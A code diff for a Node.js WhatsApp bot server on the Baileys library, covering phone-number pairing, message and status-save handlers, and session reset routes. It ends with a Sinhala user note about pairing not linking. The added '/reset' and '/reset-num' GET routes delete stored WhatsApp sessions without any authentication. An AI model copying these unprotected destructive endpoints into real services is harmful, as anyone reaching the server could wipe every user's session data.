+  // 🎯 2. SETTINGS MENU REPLY HANDLER (Group වලත් Owner ට reply මගින් setting වෙනස් කළ හැක)
+  if (settingsOption && isAuthorized && fromSettingsMenu && !fromMainMenu) {
+    const handled = await handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum);
+    if (handled) return;
+  }
+
+  // 🎯 3. STATUS SAVE HANDLER
+  const statusKeywords = ['oni', 'ඕනි', 'ඕනෙ', 'dapan', 'දාපන්', 'ewanna', 'එවන්න', 'save', 'status', 'send'];
+  const isQuotedFromStatus = quotedContext?.remoteJid === 'status@broadcast' || quotedContext?.participant?.includes('@broadcast');
+
+  if (quotedMsgObj && (isQuotedFromStatus || statusKeywords.includes(cleanInput))) {
+    if (statusKeywords.includes(cleanInput)) {
+      const handled = await handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized);
+      if (handled) return;
+    }
+  }
+
+  // 🎯 4. PREFIX COMMANDS HANDLER
+  await handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum);
+}
+
+// ⚡ Real-time Upsert Listener
 function registerMessageUpsertHandler(sock, phoneNumber) {
-  sock.ev.on('messages.upsert', ({ messages }) => {
+  sock.ev.on('messages.upsert', ({ messages, type }) => {
     if (!messages || !messages.length) return;
     for (const msg of messages) {
       processSingleMessage(sock, msg, phoneNumber).catch(() => {});
@@ -540,7 +984,7 @@ function registerMessageUpsertHandler(sock, phoneNumber) {
 }
 
 // ============================================================================
-// 🚀 BOT INITIALIZATION
+// 🚀 MAIN WHATSAPP INITIALIZER
 // ============================================================================
 
 async function initWhatsApp(phoneNumber) {
@@ -563,6 +1007,10 @@ async function initWhatsApp(phoneNumber) {
   }
 }
 
+// ============================================================================
+// 🌐 HTTP ROUTES & ULTRA-STABLE PAIRING ENGINE
+// ============================================================================
+
 function stopAndRemoveSession(num) {
   if (!activeSessions[num]) return;
   try {
@@ -572,34 +1020,59 @@ function stopAndRemoveSession(num) {
   delete activeSessions[num];
 }
 
-// ============================================================================
-// 🌐 PAIRING ROUTE (FIXED LINKING LOGIC)
-// ============================================================================
+function registerResetAllRoute(app) {
+  app.get('/reset', async (req, res) => {
+    try {
+      await Auth.deleteMany({});
+      if (mongoose.connection.db) {
+        await mongoose.connection.db.collection('auths').deleteMany({});
+      }
+      Object.keys(activeSessions).forEach(num => {
+        try {
+          activeSessions[num].ev.removeAllListeners();
+          activeSessions[num].ws?.close();
+        } catch (e) {}
+        delete activeSessions[num];
+      });
+      settingsCache.flushAll();
+      res.json({ success: true, message: 'All sessions successfully wiped!' });
+    } catch (err) {
+      res.status(500).json({ success: false, error: err.message });
+    }
+  });
+}
+
+function registerResetSingleNumberRoute(app) {
+  app.get('/reset-num', async (req, res) => {
+    let num = req.query.num;
+    if (!num) return res.status(400).json({ error: 'Number required' });
+    num = num.replace(/[^0-9]/g, '');
+
+    try {
+      stopAndRemoveSession(num);
+      await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
+      return res.json({ success: true, message: `Session cleared for ${num}` });
+    } catch (err) {
+      return res.status(500).json({ error: err.message });
+    }
+  });
+}
 
 function registerPairRoute(app) {
   app.get('/pair', async (req, res) => {
     let num = req.query.num;
-    if (!num) return res.status(400).json({ error: 'Phone number is required!' });
-
+    if (!num) return res.status(400).json({ error: 'Number required' });
     num = num.replace(/[^0-9]/g, '');
-    if (num.length < 10) {
-      return res.status(400).json({ error: 'Invalid phone number format!' });
-    }
 
     stopAndRemoveSession(num);
-    delete isStarting[num];
-
-    try {
-      await Auth.deleteMany({ _id: { $regex: `^${num}-` } });
-      clearSettingsCache(num);
-    } catch (e) {
-      console.error('Session clean error:', e.message);
-    }
+    await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
+    await SettingsModel.findByIdAndUpdate(num, { $set: { isFirstConnectDone: false } }, { upsert: true }).catch(() => {});
+    clearSettingsCache(num);
 
     let pairSock = null;
 
     try {
-      const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(num);
+      const { state, saveCreds } = await useMongoDBAuthState(num);
       const logger = pino({ level: 'silent' });
       const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1015901307] }));
 
@@ -608,25 +1081,21 @@ function registerPairRoute(app) {
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
         logger,
         printQRInTerminal: false,
-        // Browser signature compatible with phone pairing
-        browser: ['Ubuntu', 'Chrome', '20.0.04'],
-        connectTimeoutMs: 60000,
-        defaultQueryTimeoutMs: 60000,
-        keepAliveIntervalMs: 25000,
-        markOnlineOnConnect: false,
+        browser: Browsers.macOS('Safari'),
+        connectTimeoutMs: 30000,
+        defaultQueryTimeoutMs: 25000,
+        keepAliveIntervalMs: 10000,
+        markOnlineOnConnect: true,
         emitOwnEvents: false
       });
 
-      // Code එක ගහලා connect වෙනකොට session එක save කරගන්න Listener එක
       pairSock.ev.on('creds.update', saveCreds);
 
       pairSock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect } = update;
-        
         if (connection === 'open') {
-          console.log(`🎉 SUCCESS: Linked to WhatsApp! (${num})`);
           activeSessions[num] = pairSock;
-          registerConnectionUpdateHandler(pairSock, num, clearSessionData);
+          registerConnectionUpdateHandler(pairSock, num);
           registerMessageUpsertHandler(pairSock, num);
           handleConnectionOpen(pairSock, num);
         } else if (connection === 'close') {
@@ -637,53 +1106,34 @@ function registerPairRoute(app) {
         }
       });
 
-      // Socket එක WhatsApp WebSocket එක එක්ක handshake වෙනකන් delay එකක් දීම
-      await delay(5000);
+      await delay(2000);
 
       if (!pairSock.authState.creds.registered) {
         let code = await pairSock.requestPairingCode(num);
         code = code?.match(/.{1,4}/g)?.join('-') || code;
         return res.json({ code });
       } else {
-        return res.status(400).json({ error: 'Already registered session! Clean session first.' });
+        await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
+        return res.status(400).json({ error: 'Session cleared! Please click again.' });
       }
     } catch (err) {
-      console.error(`❌ Pairing Error for ${num}:`, err?.message || err);
       if (pairSock) {
-        try {
-          pairSock.ev.removeAllListeners();
-          pairSock.ws?.close();
-        } catch (e) {}
+        try { pairSock.ws?.close(); } catch(e){}
       }
-      return res.status(500).json({
-        error: 'Pairing failed: ' + (err?.message || 'Server timeout. Wait 10 seconds and retry.')
-      });
+      return res.status(500).json({ error: 'Rate-limited. Wait 15 seconds and retry.' });
     }
   });
 }
 
 function registerAllHttpRoutes(app) {
   registerPortalRoute(app);
+  registerResetAllRoute(app);
+  registerResetSingleNumberRoute(app);
   registerPairRoute(app);
-
-  app.get('/reset-num', async (req, res) => {
-    let num = req.query.num;
-    if (!num) return res.status(400).json({ error: 'Number required' });
-    num = num.replace(/[^0-9]/g, '');
-
-    try {
-      stopAndRemoveSession(num);
-      await Auth.deleteMany({ _id: { $regex: `^${num}-` } });
-      clearSettingsCache(num);
-      return res.json({ success: true, message: `Session cleared for ${num}` });
-    } catch (err) {
-      return res.status(500).json({ error: err.message });
-    }
-  });
 }
 
 // ============================================================================
-// 🔁 STARTUP & KEEP ALIVE
+// 🔁 KEEP-ALIVE (WAKE SERVER EVERY 2 MINUTES)
 // ============================================================================
 
 function startKeepAlivePing() {
@@ -697,15 +1147,19 @@ function startKeepAlivePing() {
   }, 2 * 60 * 1000);
 }
 
+// ============================================================================
+// 🍃 STARTUP
+// ============================================================================
+
 async function reconnectAllSavedSessions() {
   try {
-    const sessions = await Auth.find({ _id: { $regex: /-creds$/ } }).lean();
+    const sessions = await Auth.find({ _id: /-creds$/ }).lean();
     console.log(`🔍 Found ${sessions.length} saved sessions in Database.`);
 
     for (const session of sessions) {
       const pNumber = session._id.split('-creds')[0];
       await initWhatsApp(pNumber);
-      await delay(8000);
+      await delay(10000);
     }
   } catch (e) {
     console.error('Error reconnecting sessions:', e.message);
@@ -740,3 +1194,5 @@ async function main() {
 
 main();
 
+
+Pair සයිට් එකේ eror එකක් ඇවිත් ඒක හදලා දියම්කො වැඩ කරන විදිහට චැට් එකකට ගිහින් .bot ගැහුවත් කෝඩ් එක එනවා link wenne nh
